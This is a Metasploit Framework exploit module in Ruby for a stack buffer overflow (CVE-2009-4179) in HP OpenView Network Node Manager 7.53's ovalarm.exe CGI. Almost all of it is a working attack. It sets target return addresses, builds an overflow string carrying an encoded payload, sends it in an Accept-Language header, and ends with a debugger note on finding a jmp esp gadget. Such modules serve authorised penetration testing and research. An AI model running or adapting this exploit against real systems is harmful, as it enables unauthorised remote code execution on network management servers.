##
# $Id: hp_nnm_ovalarm_lang.rb 10998 2010-11-11 22:43:22Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GreatRanking

	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'HP OpenView Network Node Manager ovalarm.exe CGI Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack buffer overflow in HP OpenView Network Node Manager 7.53.
				By sending a specially crafted CGI request to ovalarm.exe, an attacker can execute
				arbitrary code.

				This specific vulnerability is due to a call to "sprintf_new" in the "isWide"
				function within "ovalarm.exe". A stack buffer overflow occurs when processing an
				HTTP request that contains the following.

				1. An "Accept-Language" header longer than 100 bytes
				2. An "OVABverbose" URI variable set to "on", "true" or "1"

				The vulnerability is related to "_WebSession::GetWebLocale()" ..

				NOTE: This exploit has been tested successfully with a reverse_ord_tcp payload.
			},
			'Author'         => [ 'jduck' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 10998 $',
			'References'     =>
				[
					[ 'CVE', '2009-4179' ],
					[ 'OSVDB', '60930' ],
					[ 'BID', '37347' ],
					[ 'URL', 'http://dvlabs.tippingpoint.com/advisory/TPTI-09-12' ],
					[ 'URL', 'http://h20000.www2.hp.com/bizsupport/TechSupport/Document.jsp?objectID=c01950877' ]
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Privileged'     => false,
			'Payload'        =>
				{
					'Space'    => 650,
					'BadChars' => (0..0x1f).to_a.pack('C*'),
					'StackAdjustment'	=> -3500,
					'DisableNops' => true,
					'EncoderType'     => Msf::Encoder::Type::AlphanumMixed,
					'EncoderOptions' =>
						{
							'BufferRegister'  => 'ESP'
						},
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'HP OpenView Network Node Manager 7.53', { 'Ret' => 0x5a212a4a } ],  # jmp esp in ov.dll
					[ 'HP OpenView Network Node Manager 7.53 (Windows 2003)', { 'Ret' => 0x71c02b67 } ]   # push esp / ret in ws2_32.dll
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Dec 9 2009'))

		register_options( [ Opt::RPORT(80) ], self.class )
	end

	def exploit

		# sprintf_new(buf, "@@ isWide: comparing '%s' and '%s'", bigstr, dunno);
		start = "@@ isWide: comparing '"

		sploit = rand_text_alphanumeric(78)
		sploit << [0xffffffff].pack('V')   # for jle
		sploit << [0xffffffff].pack('V')   # increment me!
		sploit << rand_text_alphanumeric(4)
		sploit << [0x5a404058].pack('V')   # ptr to nul byte
		sploit << rand_text_alphanumeric(8)
		sploit << [target.ret].pack('V')   # ret
		sploit << payload.encoded

		print_status("Trying target #{target.name}...")

		send_request_cgi({
			'uri'		  => "/OvCgi/ovalarm.exe?OVABverbose=1",
			'method'	  => "GET",
			'headers'  => { 'Accept-Language' => sploit }
		}, 3)

		handler

	end

end

=begin
1:014> s -b 0x5a000000 0x5a06a000 ff e4
5a01d78d  ff e4 00 00 83 c4 08 85-c0 75 14 68 18 2f 04 5a  .........u.h./.Z
1:014> u 0x5a01d78d L1
ov!OVHelpAPI+0x18d:
5a01d78d ffe4            jmp     esp <- jmp esp for 7.53, will update in a sec.
=end
